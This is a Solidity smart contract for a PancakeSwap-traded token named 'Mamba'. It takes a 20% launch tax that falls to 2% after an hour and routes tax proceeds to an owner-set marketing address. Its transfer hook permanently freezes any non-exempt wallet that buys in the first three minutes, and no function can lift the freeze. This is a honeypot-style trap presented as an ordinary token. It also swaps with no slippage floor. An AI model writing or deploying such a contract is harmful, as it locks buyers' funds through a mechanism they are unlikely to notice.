// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

interface IPancakePair{
    function sync() external;
}

interface IPancakeRouter02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IPancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}


contract Mamba is ERC20, Ownable{
    address public marketing;
    address public dead = 0x000000000000000000000000000000000000dEaD;

    IPancakeRouter02 public pancakeRouter = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address public pancakePair;
    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;

    mapping(address => bool) public isExemptFromTax;
    mapping(address => bool) public freeze;
    uint256 public taxRate = 2000;
    uint256 public timeRecord;

    constructor(
        address _marketing, 
        address _initialRecipient
    ) ERC20("Mamba","Mamba") Ownable(msg.sender) {
        marketing = _marketing;
        pancakePair = IPancakeFactory(pancakeRouter.factory())
            .createPair(address(this), USDT);

        isExemptFromTax[marketing] = true;
        isExemptFromTax[address(this)] = true;
        
        uint256 initialSupply = 1000000000 ether;
        _mint(_initialRecipient, initialSupply);
    }

    function setConfig(address _marketing) external onlyOwner{
        marketing = _marketing;
    }

    function setTaxExemption(address _address, bool _exempt) external onlyOwner {
        isExemptFromTax[_address] = _exempt;
    }

    function swapTokensForUSDT(address _to, uint256 amount) private {

        if (amount == 0) return;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = USDT;
        
        _approve(address(this), address(pancakeRouter), amount);
        
        try pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0, 
            path,
            _to,
            block.timestamp
        ) {}catch{}

    }

    function _update(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        require(!freeze[from],"ERC20: Account has been frozen.");

        {
            if(IERC20(pancakePair).totalSupply() > 0 && timeRecord == 0) timeRecord = block.timestamp;
            if(timeRecord > 0 && block.timestamp - timeRecord >= 3600 && taxRate == 2000) taxRate = 200; 
        }

        if (from == address(0) || to == address(0)) {
            super._update(from, to, amount);
            return;
        }


        bool isSell = to == pancakePair;
        bool isBuy = from == pancakePair;
        bool takeTax = isExemptFromTax[from] || isExemptFromTax[to];

        uint256 taxAmount = 0;
        bool isPair = (isSell || isBuy);
        if (!takeTax && isPair) taxAmount = (amount * taxRate) / 10000;

        if (taxAmount > 0) {
            uint256 half = taxAmount / 2;
            super._update(from, address(this), half);
            super._update(from, dead, taxAmount - half);
            if(isSell) swapTokensForUSDT(marketing, half);

            super._update(from, to, amount - taxAmount);
        } else {
            super._update(from, to, amount);
        }

        //swap and update
        {
            
            if(IERC20(pancakePair).totalSupply() > 0 && block.timestamp - timeRecord < 180 && isBuy && !isExemptFromTax[to]) freeze[to] = true; 

            if(!isPair) {
                swapTokensForUSDT(marketing, balanceOf(address(this)) / 2);
                super._update(address(this), dead, balanceOf(address(this)));
            }
        }
        
    }

}